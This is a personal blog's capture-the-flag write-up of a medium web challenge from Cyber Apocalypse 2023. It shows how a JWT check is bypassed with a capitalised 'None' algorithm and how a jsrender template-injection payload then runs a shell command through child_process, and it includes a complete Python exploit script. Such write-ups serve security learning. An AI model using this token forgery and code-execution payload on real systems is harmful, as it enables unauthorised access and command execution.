@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title> Cyber Apocalypse CTF 2023 - Didactic Octo Paddles —   | Gabriele Pongelli</title>
+<meta name="description" content="This is the blog of Gabriele Pongelli.">
+<meta name="keywords" content="">
+<link rel="canonical" href="/posts/writeups/web/htbctf2023-didactic-octo-paddles">
+    <link rel="stylesheet" href="/assets/css/github-markdown.css" type="text/css" />
+<link rel="stylesheet" href="/assets/css/github.css" type="text/css" />
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha512-NhSC1YmyruXifcj/KFRWoC561YpHpc5Jtzgvbuzx5VozKpWvQ+4nXhPdFgmx8xqexRcpAglTj9sIBWINXa8x5w==" crossorigin="anonymous" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" />
+<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    </head>
+    <body>
+        <div class="wrapper">
+        <header class="header">
+    <div class="navigation">
+        <a href="/" class="logo">Gabriele Pongelli</a>
+        <ul class="menu">
+            
+            
+            <li class="menu__entry"><a href="/">Home</a></li>
+            
+            <li class="menu__entry"><a href="/posts">Posts</a></li>
+            
+            <li class="menu__entry"><a href="/projects">Projects</a></li>
+            
+            <li class="menu__entry"><a href="/about">About</a></li>
+            
+        </ul>
+    </div>
+    <ul class="social-links">
+    
+    <a href="mailto:pongelligabriele@gmail.com" class="social-links__entry" target="_blank">
+    <em class="fa fa-envelope-square"></em>
+    </a>
+    
+    
+    <a href="https://github.com/gabrielepongelli" class="social-links__entry" target="_blank">
+    <em class="fab fa-github"></em>
+    </a>
+    
+    
+    <a href="https://in.linkedin.com/in/gabriele-p-68027a166" class="social-links__entry" target="_blank">
+    <em class="fab fa-linkedin"></em>
+    </a>
+    
+    </ul>
+</header>
+        <h1 class="page-title">
+<div class="page-title__text">Cyber Apocalypse CTF 2023 - Didactic Octo Paddles</div>
+<div class="page-title__subtitle"></div>
+</h1>
+
+<div class="entry-content markdown-body">
+<p>
+    <strong class="post-meta">
+        <time class="dt-published" datetime="2023-03-20T00:00:00+00:00" itemprop="datePublished">Mar 20, 2023
+        </time></strong>
+</p>
+
+<p><strong>Category:</strong> Web<br />
+<strong>Difficulty:</strong> Medium<br />
+<strong>Description</strong>: You have been hired by the Intergalactic Ministry of Spies to retrieve a powerful relic that is believed to be hidden within the small paddle shop, by the river. You must hack into the paddle shop’s system to obtain information on the relic’s location. Your ultimate challenge is to shut down the parasitic alien vessels and save humanity from certain destruction by retrieving the relic hidden within the Didactic Octo Paddles shop.<br />
+<strong>Address</strong>: 142.93.38.14:30270<br />
+<strong>Attachments</strong>: <a href="/assets/data/writeups/web/htbctf2023-didactic_octo_paddles/web_didactic_octo_paddle.zip">web_didactic_octo_paddle.zip</a><br /></p>
+
+<p>If we visit the address we will see a login page that asks us for username and password and nothing else is present:
+<img src="/assets/data/writeups/web/htbctf2023-didactic_octo_paddles/imgs/login_page.png" alt="" />
+Since we have also the source code of the website, let’s take a look into it.</p>
+
+<p>From the Dockerfile we can see that the file containing the flag is located at <strong><code class="language-plaintext highlighter-rouge">/flag.txt</code></strong>. From the sources we can see that the website is made using the javascript Express framework. If we take a look at the <strong><code class="language-plaintext highlighter-rouge">web_didactic_octo_paddle/challenge/routes/index.js</code></strong> file we can see some interesting endpoints. First of all there is a <strong><code class="language-plaintext highlighter-rouge">/register</code></strong> endpoint:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/register</span><span class="dl">"</span><span class="p">,</span> <span class="k">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="k">try</span> <span class="p">{</span>
+        <span class="kd">const</span> <span class="nx">username</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">username</span><span class="p">;</span>
+        <span class="kd">const</span> <span class="nx">password</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">password</span><span class="p">;</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">username</span> <span class="o">||</span> <span class="o">!</span><span class="nx">password</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="nx">res</span>
+                <span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">)</span>
+                <span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">response</span><span class="p">(</span><span class="dl">"</span><span class="s2">Username and password are required</span><span class="dl">"</span><span class="p">));</span>
+        <span class="p">}</span>
+
+        <span class="kd">const</span> <span class="nx">existingUser</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">db</span><span class="p">.</span><span class="nx">Users</span><span class="p">.</span><span class="nx">findOne</span><span class="p">({</span>
+            <span class="na">where</span><span class="p">:</span> <span class="p">{</span> <span class="na">username</span><span class="p">:</span> <span class="nx">username</span> <span class="p">},</span>
+        <span class="p">});</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">existingUser</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="nx">res</span>
+                <span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">)</span>
+                <span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">response</span><span class="p">(</span><span class="dl">"</span><span class="s2">Username already exists</span><span class="dl">"</span><span class="p">));</span>
+        <span class="p">}</span>
+
+        <span class="k">await</span> <span class="nx">db</span><span class="p">.</span><span class="nx">Users</span><span class="p">.</span><span class="nx">create</span><span class="p">({</span>
+            <span class="na">username</span><span class="p">:</span> <span class="nx">username</span><span class="p">,</span>
+            <span class="na">password</span><span class="p">:</span> <span class="nx">bcrypt</span><span class="p">.</span><span class="nx">hashSync</span><span class="p">(</span><span class="nx">password</span><span class="p">),</span>
+        <span class="p">}).</span><span class="nx">then</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+            <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">response</span><span class="p">(</span><span class="dl">"</span><span class="s2">User registered succesfully</span><span class="dl">"</span><span class="p">));</span>
+        <span class="p">});</span>
+    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">error</span><span class="p">);</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">send</span><span class="p">({</span>
+            <span class="na">error</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Something went wrong!</span><span class="dl">"</span><span class="p">,</span>
+        <span class="p">});</span>
+    <span class="p">}</span>
+<span class="p">});</span>
+</code></pre></div></div>
+
+<p>This means that, even if we don’t know any credential for the login page, we can register to create new ones and then log in. We can see that the username that we provide is directly stored without performing any additional check (apart that it must not be already registered). Then we can see another interesting endpoint called <strong><code class="language-plaintext highlighter-rouge">/admin</code></strong>:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">router</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">/admin</span><span class="dl">"</span><span class="p">,</span> <span class="nx">AdminMiddleware</span><span class="p">,</span> <span class="k">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="k">try</span> <span class="p">{</span>
+        <span class="kd">const</span> <span class="nx">users</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">db</span><span class="p">.</span><span class="nx">Users</span><span class="p">.</span><span class="nx">findAll</span><span class="p">();</span>
+        <span class="kd">const</span> <span class="nx">usernames</span> <span class="o">=</span> <span class="nx">users</span><span class="p">.</span><span class="nx">map</span><span class="p">((</span><span class="nx">user</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">user</span><span class="p">.</span><span class="nx">username</span><span class="p">);</span>
+
+        <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="dl">"</span><span class="s2">admin</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
+            <span class="na">users</span><span class="p">:</span> <span class="nx">jsrender</span><span class="p">.</span><span class="nx">templates</span><span class="p">(</span><span class="s2">`</span><span class="p">${</span><span class="nx">usernames</span><span class="p">}</span><span class="s2">`</span><span class="p">).</span><span class="nx">render</span><span class="p">(),</span>
+        <span class="p">});</span>
+    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">error</span><span class="p">);</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">Something went wrong!</span><span class="dl">"</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">});</span>
+</code></pre></div></div>
+
+<p>It displays the username of every registered user. Since the variable containing the username is directly passed to the function that will render it in HTML, and we control its value (when we register a new user) we can control the code that will be rendered and transformed into HTML. So we can perform a Server Side Template Injection (SSTI). But, in order to do that we need to access this <strong><code class="language-plaintext highlighter-rouge">/admin</code></strong> endpoint. From its code we can see that its access is regulated by the <strong><code class="language-plaintext highlighter-rouge">AdminMiddleware</code></strong> function, which is located in the <strong><code class="language-plaintext highlighter-rouge">web_didactic_octo_paddle/challenge/middleware/AdminMiddleware.js</code></strong> file. Let’s see what it does:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">AdminMiddleware</span> <span class="o">=</span> <span class="k">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="k">try</span> <span class="p">{</span>
+        <span class="kd">const</span> <span class="nx">sessionCookie</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">session</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">sessionCookie</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="dl">"</span><span class="s2">/login</span><span class="dl">"</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="kd">const</span> <span class="nx">decoded</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">decode</span><span class="p">(</span><span class="nx">sessionCookie</span><span class="p">,</span> <span class="p">{</span> <span class="na">complete</span><span class="p">:</span> <span class="kc">true</span> <span class="p">});</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="nx">decoded</span><span class="p">.</span><span class="nx">header</span><span class="p">.</span><span class="nx">alg</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">none</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="dl">"</span><span class="s2">/login</span><span class="dl">"</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">decoded</span><span class="p">.</span><span class="nx">header</span><span class="p">.</span><span class="nx">alg</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">HS256</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
+            <span class="kd">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">verify</span><span class="p">(</span><span class="nx">sessionCookie</span><span class="p">,</span> <span class="nx">tokenKey</span><span class="p">,</span> <span class="p">{</span>
+                <span class="na">algorithms</span><span class="p">:</span> <span class="p">[</span><span class="nx">decoded</span><span class="p">.</span><span class="nx">header</span><span class="p">.</span><span class="nx">alg</span><span class="p">],</span>
+            <span class="p">});</span>
+            <span class="k">if</span> <span class="p">(</span>
+                <span class="o">!</span><span class="p">(</span><span class="k">await</span> <span class="nx">db</span><span class="p">.</span><span class="nx">Users</span><span class="p">.</span><span class="nx">findOne</span><span class="p">({</span>
+                    <span class="na">where</span><span class="p">:</span> <span class="p">{</span> <span class="na">id</span><span class="p">:</span> <span class="nx">user</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span> <span class="na">username</span><span class="p">:</span> <span class="dl">"</span><span class="s2">admin</span><span class="dl">"</span> <span class="p">},</span>
+                <span class="p">}))</span>
+            <span class="p">)</span> <span class="p">{</span>
+                <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">You are not an admin</span><span class="dl">"</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="kd">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">verify</span><span class="p">(</span><span class="nx">sessionCookie</span><span class="p">,</span> <span class="kc">null</span><span class="p">,</span> <span class="p">{</span>
+                <span class="na">algorithms</span><span class="p">:</span> <span class="p">[</span><span class="nx">decoded</span><span class="p">.</span><span class="nx">header</span><span class="p">.</span><span class="nx">alg</span><span class="p">],</span>
+            <span class="p">});</span>
+            <span class="k">if</span> <span class="p">(</span>
+                <span class="o">!</span><span class="p">(</span><span class="k">await</span> <span class="nx">db</span><span class="p">.</span><span class="nx">Users</span><span class="p">.</span><span class="nx">findOne</span><span class="p">({</span>
+                    <span class="na">where</span><span class="p">:</span> <span class="p">{</span> <span class="na">id</span><span class="p">:</span> <span class="nx">user</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span> <span class="na">username</span><span class="p">:</span> <span class="dl">"</span><span class="s2">admin</span><span class="dl">"</span> <span class="p">},</span>
+                <span class="p">}))</span>
+            <span class="p">)</span> <span class="p">{</span>
+                <span class="k">return</span> <span class="nx">res</span>
+                    <span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">403</span><span class="p">)</span>
+                    <span class="p">.</span><span class="nx">send</span><span class="p">({</span> <span class="na">message</span><span class="p">:</span> <span class="dl">"</span><span class="s2">You are not an admin</span><span class="dl">"</span> <span class="p">});</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="dl">"</span><span class="s2">/login</span><span class="dl">"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="nx">next</span><span class="p">();</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>It checks our session jwt token in this way:</p>
+<ul>
+  <li>If we haven’t it, we will be redirected to the login page.</li>
+  <li>Otherwise it tries to decode it and see the algorithm used to generate the token:
+    <ol>
+      <li>If is <strong><code class="language-plaintext highlighter-rouge">"none"</code></strong>, again we will be redirected to the login page.</li>
+      <li>If is <strong><code class="language-plaintext highlighter-rouge">"HS256"</code></strong>, then it verify the signature of the token using a secret key, extract the user id associated to the token and search if it correspond to the <strong><code class="language-plaintext highlighter-rouge">admin</code></strong> user and, if it is so then access is granted, otherwise an error will be raised.</li>
+      <li>If the algorithm has other values that the ones specified, it again verify the signature of the token <strong><code class="language-plaintext highlighter-rouge">without using any secret key</code></strong>, extract the user id associated to the token and search if it correspond to the <strong><code class="language-plaintext highlighter-rouge">admin</code></strong> user and, if it is so then access is granted, otherwise an error will be raised.</li>
+    </ol>
+  </li>
+</ul>
+
+<p>So, since we don’t know the secret password used to sign the tokens, the only chance we have is to fall in the third case. We can try to use other algorithms, but all of them requires a key to be used for the verification, which the server doesn’t use. The perfect algorithm would be the <strong><code class="language-plaintext highlighter-rouge">none</code></strong> (which doesn’t sign the token, so in the verification it would require no key), but we cannot use it… But, if we look more closely to the code, we can see that the check against the value of the algorithm used is done considering only lowercase letters, so if we specify it using, for example, a capital “N” instead of a lowercased one, we will fall back in the third case, and we will still be able to use the <strong><code class="language-plaintext highlighter-rouge">none</code></strong> algorithm.</p>
+
+<p>In order to do this we have to forge a custom token like the following one:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span>
+    <span class="dl">"</span><span class="s2">alg</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">None</span><span class="dl">"</span><span class="p">,</span>
+    <span class="dl">"</span><span class="s2">typ</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">JWT</span><span class="dl">"</span>
+<span class="p">}</span>
+<span class="p">{</span>
+    <span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">:</span> <span class="p">...</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>In the <strong><code class="language-plaintext highlighter-rouge">id</code></strong> field of the payload part of the token we have to insert the id of the <strong><code class="language-plaintext highlighter-rouge">admin</code></strong> user. By looking at the code we can see that, in the <strong><code class="language-plaintext highlighter-rouge">web_didactic_octo_paddle/challenge/utils/database.js</code></strong> file it is defined the schema that represents a <strong><code class="language-plaintext highlighter-rouge">User</code></strong> entity, and create the <strong><code class="language-plaintext highlighter-rouge">admin</code></strong> user:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">....</span>
+<span class="p">....</span>
+<span class="nx">Database</span><span class="p">.</span><span class="nx">Users</span> <span class="o">=</span> <span class="nx">sequelize</span><span class="p">.</span><span class="nx">define</span><span class="p">(</span><span class="dl">"</span><span class="s2">user</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
+    <span class="na">id</span><span class="p">:</span> <span class="p">{</span>
+        <span class="na">type</span><span class="p">:</span> <span class="nx">Sequelize</span><span class="p">.</span><span class="nx">INTEGER</span><span class="p">,</span>
+        <span class="na">autoIncrement</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
+        <span class="na">primaryKey</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
+        <span class="na">allowNull</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+        <span class="na">unique</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
+    <span class="p">},</span>
+    <span class="na">username</span><span class="p">:</span> <span class="p">{</span>
+        <span class="na">type</span><span class="p">:</span> <span class="nx">Sequelize</span><span class="p">.</span><span class="nx">STRING</span><span class="p">,</span>
+        <span class="na">allowNull</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+        <span class="na">unique</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
+    <span class="p">},</span>
+    <span class="na">password</span><span class="p">:</span> <span class="p">{</span>
+        <span class="na">type</span><span class="p">:</span> <span class="nx">Sequelize</span><span class="p">.</span><span class="nx">STRING</span><span class="p">,</span>
+        <span class="na">allowNull</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+    <span class="p">},</span>
+<span class="p">});</span>
+<span class="p">....</span>
+<span class="p">....</span>
+</code></pre></div></div>
+
+<p>Since the <strong><code class="language-plaintext highlighter-rouge">id</code></strong> field has the attribute <strong><code class="language-plaintext highlighter-rouge">autoIncrement</code></strong> set to <strong><code class="language-plaintext highlighter-rouge">true</code></strong>, and the <strong><code class="language-plaintext highlighter-rouge">allowNull</code></strong> attribute set to <strong><code class="language-plaintext highlighter-rouge">false</code></strong>, we can guess that it starts assigning values starting from <strong><code class="language-plaintext highlighter-rouge">1</code></strong>, and since the <strong><code class="language-plaintext highlighter-rouge">admin</code></strong> user is the first user that will be created (is the only one to be created), it will have an id equal to <strong><code class="language-plaintext highlighter-rouge">1</code></strong>. So our final craftet token will be:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span>
+    <span class="dl">"</span><span class="s2">alg</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">None</span><span class="dl">"</span><span class="p">,</span>
+    <span class="dl">"</span><span class="s2">typ</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">JWT</span><span class="dl">"</span>
+<span class="p">}</span>
+<span class="p">{</span>
+    <span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">1</span><span class="dl">"</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>After this, we can exploit the SSTI to read the content of the <strong><code class="language-plaintext highlighter-rouge">/flag.txt</code></strong> file and render it into HTML. To do this we need to register a new user with a username that will be correctly interpreted by the HTML render and execute arbitrary JavaScript commands to read the file. From the code that handle the <strong><code class="language-plaintext highlighter-rouge">/admin</code></strong> endpoint that we have seen earlier we can see that the website uses a module called <strong><code class="language-plaintext highlighter-rouge">jsrender</code></strong> to perform the rendering. With a quick online research I found <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jsrender-nodejs">here</a> the payload for us:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{{:</span><span class="dl">""</span><span class="p">.</span><span class="nx">toString</span><span class="p">.</span><span class="kd">constructor</span><span class="p">.</span><span class="nx">call</span><span class="p">({},</span><span class="dl">"</span><span class="s2">return global.process.mainModule.constructor._load(</span><span class="se">\</span><span class="s2">'child_process</span><span class="se">\</span><span class="s2">').execSync(</span><span class="se">\</span><span class="s2">'cat /flag.txt</span><span class="se">\</span><span class="s2">').toString()</span><span class="dl">"</span><span class="p">)()}}</span>
+</code></pre></div></div>
+
+<p>This code will create a child process that executes the command <strong><code class="language-plaintext highlighter-rouge">cat /flag.txt</code></strong> and transform the output into string, ready to be embedded into the final HTML. In order to automatize everything I worte the following python script:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">import</span> <span class="nn">jwt</span>
+
+<span class="n">ADDRESS</span> <span class="o">=</span> <span class="s">"142.93.38.14:30270"</span>
+
+<span class="k">def</span> <span class="nf">forge_jwt</span><span class="p">():</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s">"id"</span><span class="p">:</span> <span class="s">"1"</span>
+    <span class="p">}</span>
+
+    <span class="n">token</span> <span class="o">=</span> <span class="n">jwt</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span>
+        <span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="p">,</span>
+        <span class="n">key</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span>
+        <span class="n">algorithm</span><span class="o">=</span><span class="s">"none"</span>
+    <span class="p">)</span>
+
+    <span class="n">token</span> <span class="o">=</span> <span class="n">token</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)</span>
+    <span class="n">token</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">token</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s">'='</span><span class="p">).</span><span class="n">decode</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s">'='</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="n">token</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">token</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">replace</span><span class="p">(</span><span class="s">'"alg":"none"'</span><span class="p">,</span> <span class="s">'"alg":"None"'</span><span class="p">)</span> <span class="c1"># with capital N
+</span>    <span class="n">token</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">token</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">encode</span><span class="p">()).</span><span class="n">decode</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s">'='</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="n">token</span> <span class="o">=</span> <span class="s">"."</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
+    
+    <span class="k">return</span> <span class="n">token</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
+    <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">ADDRESS</span><span class="si">}</span><span class="s">/register"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span>
+            <span class="s">"username"</span><span class="p">:</span> <span class="s">'{{:"".toString.constructor.call({},"return global.process.mainModule.constructor._load(</span><span class="se">\'</span><span class="s">child_process</span><span class="se">\'</span><span class="s">).execSync(</span><span class="se">\'</span><span class="s">cat /flag.txt</span><span class="se">\'</span><span class="s">).toString()")()}}'</span><span class="p">,</span>
+            <span class="s">"password"</span><span class="p">:</span> <span class="s">"test"</span>
+        <span class="p">},</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span>
+            <span class="s">"Content-Type"</span><span class="p">:</span> <span class="s">"application/json"</span>
+        <span class="p">})</span>
+
+    <span class="n">s</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nb">set</span><span class="p">(</span><span class="s">'session'</span><span class="p">,</span> <span class="n">forge_jwt</span><span class="p">())</span>
+
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">ADDRESS</span><span class="si">}</span><span class="s">/admin"</span><span class="p">)</span>
+    <span class="n">flag</span> <span class="o">=</span> <span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'HTB{'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">flag</span> <span class="o">=</span> <span class="s">"HTB{"</span> <span class="o">+</span> <span class="n">flag</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'}'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s">'}'</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>And, finally, if we execute it:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">chmod</span> +x exploit.py
+<span class="nv">$ </span>./exploit.py
+HTB<span class="o">{</span>Pr3_C0MP111N6_W17H0U7_P4DD13804rD1N6_5K1115<span class="o">}</span>
+</code></pre></div></div>
+
+</div>
+        </div>
+        <footer class="about">
+    <div class="about__devider">*****</div>
+    <div class="about__text">
+        🛠️ Powered by Jekyll 🛠️
+        <br> 📖 Hosted on GitHub Pages 📖
+    </div>
+</footer>
+    </body>
+</html>
